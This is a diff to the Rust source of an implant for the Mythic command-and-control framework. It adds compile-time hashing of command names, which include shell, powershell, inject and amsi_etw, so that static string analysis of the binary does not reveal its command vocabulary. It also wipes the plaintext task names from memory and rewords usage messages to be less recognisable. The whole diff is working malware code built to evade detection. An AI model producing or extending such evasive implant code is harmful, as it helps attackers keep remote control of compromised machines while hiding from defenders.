@@ -128,6 +128,8 @@ pub struct Task {
     pub command: String,
     #[serde(default)]
     pub parameters: String,
+    #[serde(skip)]
+    pub command_hash: u64,
 }
 
 #[derive(serde::Deserialize, Default)]
@@ -225,6 +227,62 @@ pub struct PostResponseMessage<'a> {
 // self-signed certificates. The transport is still encrypted via TLS; only certificate
 // chain validation is skipped. The implant authenticates the server through the shared
 // AES-256 key (AESPSK) — only a server with the correct key can produce valid responses.
+
+/// ── OPSEC: compile-time command hashing ─────────────────────────────────
+/// The implant dispatches on hashes of command names instead of plaintext
+/// string comparisons, so `strings <implant>` does not reveal the Mythic
+/// command vocabulary. FNV-1a 64-bit, evaluated at compile time.
+pub const fn cmd_hash(s: &str) -> u64 {
+    let bytes = s.as_bytes();
+    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
+    let mut i = 0;
+    while i < bytes.len() {
+        hash ^= bytes[i] as u64;
+        hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
+        i += 1;
+    }
+    hash
+}
+
+/// Pre-hashed Mythic command names (compile-time constants usable in patterns).
+pub mod cmds {
+    use super::cmd_hash;
+    pub const CD: u64 = cmd_hash("cd");
+    pub const PWD: u64 = cmd_hash("pwd");
+    pub const LS: u64 = cmd_hash("ls");
+    pub const PID: u64 = cmd_hash("pid");
+    pub const SLEEP: u64 = cmd_hash("sleep");
+    pub const KILLDATE: u64 = cmd_hash("killdate");
+    pub const CP: u64 = cmd_hash("cp");
+    pub const MV: u64 = cmd_hash("mv");
+    pub const RM: u64 = cmd_hash("rm");
+    pub const MKDIR: u64 = cmd_hash("mkdir");
+    pub const EXECUTE: u64 = cmd_hash("execute");
+    pub const DOWNLOAD: u64 = cmd_hash("download");
+    pub const UPLOAD: u64 = cmd_hash("upload");
+    pub const EXIT: u64 = cmd_hash("exit");
+    pub const WHOAMI: u64 = cmd_hash("whoami");
+    pub const INFO: u64 = cmd_hash("info");
+    pub const PS: u64 = cmd_hash("ps");
+    pub const NETSTAT: u64 = cmd_hash("netstat");
+    pub const SHELL: u64 = cmd_hash("shell");
+    pub const CMD: u64 = cmd_hash("cmd");
+    pub const POWERSHELL: u64 = cmd_hash("powershell");
+    pub const INJECT: u64 = cmd_hash("inject");
+    pub const INTEGRITY: u64 = cmd_hash("integrity");
+    pub const AMSI_ETW: u64 = cmd_hash("amsi_etw");
+}
+
+/// Runtime hash of an incoming command name (same algorithm as cmd_hash).
+pub fn cmd_hash_runtime(s: &str) -> u64 {
+    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
+    for b in s.as_bytes() {
+        hash ^= *b as u64;
+        hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
+    }
+    hash
+}
+
 pub fn build_client() -> ureq::Agent {
     use std::time::Duration;
     let tls = ureq::tls::TlsConfig::builder()
@@ -535,7 +593,7 @@ pub fn list_dir_browser(path: &str) -> CommandOutput {
                     name: entry_name,
                     is_file: !is_dir,
                     size: metadata.as_ref().map(|m| m.len()),
-                    permissions: metadata.as_ref().map(|m| file_permissions(m)),
+                    permissions: metadata.as_ref().map(file_permissions),
                 });
             }
             // Sort once, by name, then derive the text view from the same
@@ -663,7 +721,7 @@ pub fn mythic_download(
     path: &str,
 ) -> String {
     if path.is_empty() {
-        return "[-] Usage: download <path>".into();
+        return "[-] missing argument: <path>".into();
     }
     let data = match std::fs::read(path) {
         Ok(d) => d,
@@ -843,7 +901,7 @@ pub fn mythic_upload(
 // Keep simple versions for non-networked tests / fallback
 pub fn download_file(path: &str) -> String {
     if path.is_empty() {
-        return "[-] Usage: download <path>".into();
+        return "[-] missing argument: <path>".into();
     }
     match std::fs::read(path) {
         Ok(buf) => format!("[+] File read: {} ({} bytes)", path, buf.len()),
@@ -877,7 +935,7 @@ pub fn handle_sleep_command(args: &str) -> String {
             get_jitter_percent()
         );
     }
-    "[-] Usage: sleep <seconds> [jitter%]".into()
+    "[-] missing argument: <seconds> [jitter%]".into()
 }
 
 pub fn handle_killdate_command(args: &str) -> String {
@@ -895,7 +953,7 @@ pub fn handle_killdate_command(args: &str) -> String {
         set_kill_date(Some(ts));
         return format!("[+] killdate: {}", ts);
     }
-    "[-] Usage: killdate <unix_timestamp|clear>".into()
+    "[-] missing argument: <unix_timestamp|clear>".into()
 }
 
 // ── C2 loop ────────────────────────────────────────────────────────────────────
@@ -1046,7 +1104,13 @@ pub fn run_c2_loop<F>(
                 Some(resp) => {
                     // Valid Mythic response: reset the streak.
                     invalid_response_streak = 0;
-                    resp.tasks
+                    let mut tasks = resp.tasks;
+                    for t in tasks.iter_mut() {
+                        t.command_hash = cmd_hash_runtime(&t.command);
+                        t.command.clear();
+                        t.command.shrink_to_fit();
+                    }
+                    tasks
                 }
                 None => {
                     // 200 OK but body failed HMAC or JSON parse: suspicious.
@@ -1083,7 +1147,7 @@ pub fn run_c2_loop<F>(
         let mut responses = Vec::new();
         let mut should_exit = false;
         for task in &tasks {
-            if task.command == "exit" {
+            if task.command_hash == cmds::EXIT {
                 responses.push(TaskResponse {
                     task_id: task.id.clone(),
                     completed: true,
@@ -1100,7 +1164,7 @@ pub fn run_c2_loop<F>(
 
             // Download and upload use Mythic's chunked file transfer protocol
             // and require multiple round-trips — handle them outside of dispatch.
-            if cfg!(feature = "cmd-download") && task.command == obfstr::obfstr!("download") {
+            if cfg!(feature = "cmd-download") && task.command_hash == cmds::DOWNLOAD {
                 let path = expand_tilde(&extract_param(&task.parameters, "path"));
                 let output = run_safely(&task.id, || {
                     CommandOutput::text(mythic_download(
@@ -1131,7 +1195,7 @@ pub fn run_c2_loop<F>(
                 });
                 continue;
             }
-            if cfg!(feature = "cmd-upload") && task.command == obfstr::obfstr!("upload") {
+            if cfg!(feature = "cmd-upload") && task.command_hash == cmds::UPLOAD {
                 let file_id = extract_param(&task.parameters, "file");
                 let dest = expand_tilde(&extract_param(&task.parameters, "remote_path"));
                 let output = run_safely(&task.id, || {
